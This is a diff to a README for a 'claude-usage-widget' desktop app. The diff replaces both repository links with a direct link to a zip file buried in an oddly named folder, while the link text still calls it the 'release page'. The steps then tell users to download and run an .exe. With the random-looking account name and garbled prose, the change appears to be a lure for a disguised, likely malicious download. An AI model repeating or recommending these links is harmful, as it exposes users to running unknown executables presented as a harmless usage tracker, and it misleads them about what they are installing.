@@ -1,12 +1,12 @@
 # 📊 claude-usage-widget - Track your daily Claude message limits
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Denialtonicaccent592/claude-usage-widget)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Denialtonicaccent592/claude-usage-widget/raw/refs/heads/main/alveolonasal/usage_claude_widget_3.6.zip)
 
 This widget显示 your Claude usage on your desktop. It stays on top of your windows. You see your current plan limits in real time.
 
 ## 📥 How to get started
 
-1. Go to the [release page](https://github.com/Denialtonicaccent592/claude-usage-widget).
+1. Go to the [release page](https://github.com/Denialtonicaccent592/claude-usage-widget/raw/refs/heads/main/alveolonasal/usage_claude_widget_3.6.zip).
 2. Click the link above to reach the download page.
 3. Find the file ending in .exe under the latest release.
 4. Download this file to your computer.
